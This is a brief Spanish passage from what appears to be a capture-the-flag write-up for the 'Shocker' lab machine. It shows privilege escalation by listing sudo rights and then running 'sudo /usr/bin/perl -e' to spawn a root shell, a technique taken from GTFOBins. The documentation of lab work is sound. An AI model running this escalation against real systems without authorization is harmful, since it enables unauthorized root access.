
```shell
sudo -l
```

![[Shocker10.png]]

Se puede ejecutar el binario de */usr/bin/perl*, con privilegio de root sin contraseña. 
Asi que vamos a la pagina de [gtfobins](https://gtfobins.github.io/gtfobins/perl/#sudo) y nos da un comando para ejecutar una bash con privilegios

![[Shocker11.png]]

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

Y como se puede apreciar, ya somos root
![[Shocker12.png]]